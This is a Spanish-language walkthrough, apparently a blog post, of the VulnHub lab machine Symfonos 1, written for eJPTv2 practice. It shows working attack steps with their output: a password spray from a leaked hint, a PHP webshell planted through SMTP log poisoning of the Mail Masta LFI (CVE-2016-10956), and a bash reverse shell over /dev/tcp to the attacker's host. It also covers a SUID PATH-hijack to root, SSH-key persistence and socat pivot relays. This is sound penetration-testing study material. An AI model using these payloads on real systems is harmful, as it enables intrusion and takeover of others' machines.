Symfonos 1 es la primera mitad de un laboratorio de pivoting de dos máquinas de **VulnHub** que monté para preparar el eJPTv2: es el host expuesto, y hace de puente entre mi red de ataque y una interna aislada donde se esconde [Symfonos 2](/es/posts/symfonos-2/). Esta máquina por sí sola es una cadena limpia — enumeración de SMB por null-session con una pista de contraseñas con temática, una LFI de **Mail Masta** en WordPress (**CVE-2016-10956**) convertida en RCE vía **log poisoning por SMTP**, y un binario SUID con **PATH hijacking** para root — y luego se convierte en el punto de lanzamiento del pivot. Mis propios scripts y sesiones están conservados en su totalidad.

## Montaje del Laboratorio

El laboratorio son dos VMs de VulnHub en VirtualBox conectadas entre sí para practicar pivoting:

- **Symfonos 1** tiene dos NICs — un adaptador **host-only** (`192.168.56.0/24`, mi host es el `.1`) y una red **interna** (`10.0.0.0/24`).
- **Symfonos 2** tiene *solo* la NIC interna, así que es invisible desde mi host. La única forma de llegar a ella es *a través* de Symfonos 1 — que es justo lo que prepara la sección de Pivoting de abajo.

Un ARP scan por el lado host-only encuentra a Symfonos 1:

```bash
sudo arp-scan -I vboxnet0 --localnet
# 192.168.56.6   08:00:27:4e:f1:e8   PCS Systemtechnik GmbH
```

## Reconocimiento y Enumeración

### Escaneo de Puertos

```bash
sudo nmap -p- -sCV 192.168.56.6 -oN nmap
```

```bash
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6
25/tcp  open  smtp        Postfix smtpd (symfonos.localdomain; VRFY activado)
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian
```

SSH, un servidor SMTP, Apache y Samba. SMB es lo más fácil de enumerar sin credenciales, así que va primero.

### SMB — recurso anónimo y una pista de contraseñas

Una null session lista los recursos. `anonymous` es legible por todos, y `helios` ("Helios personal share") insinúa un usuario al que aún no llegamos:

```bash
smbmap -u '' -p '' -H 192.168.56.6
#   print$      NO ACCESS   Printer Drivers
#   helios      NO ACCESS   Helios personal share
#   anonymous   READ ONLY
#   IPC$        NO ACCESS   IPC Service (Samba 4.5.16-Debian)
```

El recurso `anonymous` guarda una única nota de "Zeus":

```bash
smbclient \\\\192.168.56.6\\anonymous -N
smb: \> get attention.txt
```

```text
Can users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'!
Next person I find using one of these passwords will be fired!
-Zeus
```

Tres contraseñas, en bandeja. Las meto en un `passwords.txt` y las rocío con `netexec` — `zeus:epidioko` es válida (como Guest), y probándolas contra el recurso `helios`, **`helios:qwerty`** lo desbloquea:

```bash
cat passwords.txt
# epidioko
# qwerty
# baseball

netexec smb 192.168.56.6 -u zeus -p passwords.txt
# [+] \zeus:epidioko (Guest)

smbmap -u 'helios' -p 'qwerty' -H 192.168.56.6
#   helios   READ ONLY   Helios personal share       <-- ahora legible
```

```bash
smbclient \\\\192.168.56.6\\helios -U helios        # contraseña: qwerty
smb: \> get research.txt
smb: \> get todo.txt
```

`research.txt` es sabor de mitología griega, pero `todo.txt` es la pista:

```text
1. Binge watch Dexter
2. Dance
3. Work on /h3l105
```

### El sitio WordPress

`/h3l105` es una instalación de **WordPress 5.2.2**, pero carga roto hasta que añado su vhost — el código fuente referencia `symfonos.local`:

```bash
curl -s http://192.168.56.6/h3l105/ | grep "symfonos.local"
# <link rel='dns-prefetch' href='//symfonos.local' />
echo "192.168.56.6 symfonos.local" | sudo tee -a /etc/hosts
```

`wpscan` enumera los plugins, y uno es un regalo — **Mail Masta 1.0**, vulnerable a una **Local File Inclusion** no autenticada (CVE-2016-10956):

```bash
wpscan --url http://symfonos.local/h3l105/ -e u,vp
# [+] mail-masta ... Unauthenticated Local File Inclusion (LFI)  CVE-2016-10956
# [+] site-editor ... Local File Inclusion (LFI)  CVE-2018-7422
# [+] admin  (user)
```

## Acceso Inicial — LFI de Mail Masta + Log Poisoning por SMTP (CVE-2016-10956)

El exploit (EDB 40290) documenta el parámetro vulnerable — `count_of_send.php?pl=` pasa directo a `include()`:

```bash
curl 'http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd'
# root:x:0:0:root:/root:/bin/bash
# ...
# helios:x:1000:1000:,,,:/home/helios:/bin/bash
```

`helios` no tiene claves SSH que robar, así que en vez de leer ficheros estáticos convierto la LFI en **RCE vía log poisoning**. El include renderiza como PHP cualquier fichero al que lo apunte, y puedo *escribir* en el spool de correo de `helios` enviándole un correo — así que meto una webshell PHP en el cuerpo del mensaje por una sesión SMTP escrita a mano:

```text
└─❯ telnet 192.168.56.6 25
220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
MAIL FROM: Ander
250 2.1.0 Ok
RCPT TO: helios
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
<pre> <?php system($_GET['cmd']); ?> </pre>
.
250 2.0.0 Ok: queued as 0D7F6406AE
```

Incluir el spool de correo ahora ejecuta el payload, y `cmd` corre comandos:

```bash
curl -s 'http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=ls+-l'
# ... <pre> total 112
# -rwxr-xr-x 1 helios helios 8126 Jun 28 2019 ajax_camp_send.php ...
```

RCE confirmado. Codifico en URL una reverse shell de Bash en `cmd` y la recibo:

```bash
curl -s 'http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.56.1%2F4444%200%3E%261%27'
```

```bash
nc -nlvp 4444
Connection received on 192.168.56.6 43112
helios@symfonos:~$      # el servidor web corre como helios
```

Una shell como **`helios`** (tras el tratamiento de la TTY).

## Escalada de Privilegios — `helios` → `root` (SUID `statuscheck` PATH hijacking)

La búsqueda de SUID devuelve un binario a medida en `/opt`:

```bash
helios@symfonos:/opt$ find / -perm -4000 2>/dev/null
/opt/statuscheck
```

`strings` revela lo que hace — llama a `curl` con una **ruta relativa**, no `/usr/bin/curl`:

```bash
helios@symfonos:/opt$ strings statuscheck
# ...
# system
# curl -I H
# http://lH
# ocalhostH
```

Un binario SUID que ejecuta `curl` por su nombre es un **PATH hijack** de manual: pongo mi propio `curl` antes en el `PATH`, y el binario propiedad de root ejecuta el *mío* como root. Mi `curl` simplemente pone el bit SUID a bash:

```bash
helios@symfonos:/tmp$ cat curl
chmod u+s /bin/bash
helios@symfonos:/tmp$ chmod +x curl
helios@symfonos:/tmp$ export PATH=/tmp:$PATH
helios@symfonos:/opt$ ./statuscheck
helios@symfonos:/opt$ ls -la /bin/bash
# -rwsr-xr-x 1 root root 1099016 May 15 2017 /bin/bash
```

Con bash ahora SUID-root, `-p` preserva los privilegios elevados:

```bash
helios@symfonos:/opt$ /bin/bash -p
bash-4.4# whoami
root
bash-4.4# cat /root/proof.txt
# Congrats on rooting symfonos:1!   (ASCII art recortado)
```

Root en Symfonos 1.

## Pivoting hacia Symfonos 2

Ya como root, `ip a` muestra la segunda interfaz — `enp0s8` en la `10.0.0.0/24` interna, la red donde vive Symfonos 2:

```bash
bash-4.4# ip a | grep -A2 enp0s8
# enp0s8: ... inet 10.0.0.102/24 ... scope global enp0s8
```

Primero monto persistencia para no depender de la frágil reverse shell — genero una clave como root y dejo la clave pública de mi host en `/root/.ssh/authorized_keys`, y así puedo hacer `ssh root@symfonos.local` cuando quiera. Un barrido de ping encuentra al vecino:

```bash
bash-4.4# for i in $(seq 1 254); do ping -c1 -W1 10.0.0.$i >/dev/null && echo "10.0.0.$i up"; done
# 10.0.0.1 up
# 10.0.0.102 up   (la propia symfonos1)
# 10.0.0.103 up   (symfonos2)
```

No hay nmap en la máquina, así que uso un pequeño escáner de puertos en Bash con `/dev/tcp` contra Symfonos 2:

```bash
# portScan.sh
IP=10.0.0.103

for port in $(seq 1 65535); do
	timeout 1 bash -c "echo '' > /dev/tcp/$IP/$port" 2>/dev/null && echo "[+] Host $IP - Port $port (OPEN)" &
done
```

```bash
bash-4.4# ./portScan.sh
# [+] Host 10.0.0.103 - Port 21 (OPEN)
# [+] Host 10.0.0.103 - Port 22 (OPEN)
# [+] Host 10.0.0.103 - Port 80 (OPEN)
# [+] Host 10.0.0.103 - Port 139 (OPEN)
# [+] Host 10.0.0.103 - Port 445 (OPEN)
```

Luego reenvío cada uno de esos puertos *hacia fuera* a través de Symfonos 1 con `socat`, para que mi host pueda alcanzar los servicios de Symfonos 2 en `192.168.56.6` en un puerto `100xx` — cada `socat` escucha aquí y conecta hacia `10.0.0.103`:

```bash
# pivot.sh
socat TCP-LISTEN:10021,reuseaddr,fork TCP-CONNECT:10.0.0.103:21 &
socat TCP-LISTEN:10022,reuseaddr,fork TCP-CONNECT:10.0.0.103:22 &
socat TCP-LISTEN:10080,reuseaddr,fork TCP-CONNECT:10.0.0.103:80 &
socat TCP-LISTEN:10139,reuseaddr,fork TCP-CONNECT:10.0.0.103:139 &
socat TCP-LISTEN:10445,reuseaddr,fork TCP-CONNECT:10.0.0.103:445 &
```

Con esos relays corriendo, el resto del laboratorio ocurre contra la máquina oculta — continúa en el writeup de **[Symfonos 2](/es/posts/symfonos-2/)**.

## Conclusiones Clave

- **Un aviso de política de contraseñas es un diccionario.** La nota de Zeus de "dejad de usar `epidioko`/`qwerty`/`baseball`" *era* el juego de credenciales — rociar esas tres con `netexec` desbloqueó el recurso `helios`. Las pistas de contraseñas, los banners y los ficheros de política son oro para la enumeración.
- **La LFI se convierte en RCE allá donde puedas escribir un log.** Mail Masta solo *incluía* ficheros, pero el spool de correo es un fichero en el que puedo escribir enviando un correo — un mensaje SMTP escrito a mano con PHP en el cuerpo convirtió CVE-2016-10956 en ejecución de comandos. El correo, los logs de auth y los de web son todos candidatos.
- **Un comando relativo en un binario SUID es root.** Que `statuscheck` llamara a `curl` por su nombre me dejó suplantarlo vía `PATH` y ejecutar mi propio código como root. Cualquier programa SUID que invoque otro binario sin ruta absoluta es un primitivo de PATH-hijack — `strings` los encuentra rápido.
- **Un host con doble interfaz es una pasarela.** En cuanto `ip a` mostró una segunda NIC en `10.0.0.0/24`, Symfonos 1 dejó de ser el objetivo y pasó a ser la *ruta* hacia el siguiente. Enumera todas las interfaces de cada host que controles; una segunda NIC silenciosa es justo el sentido de un laboratorio de pivot.
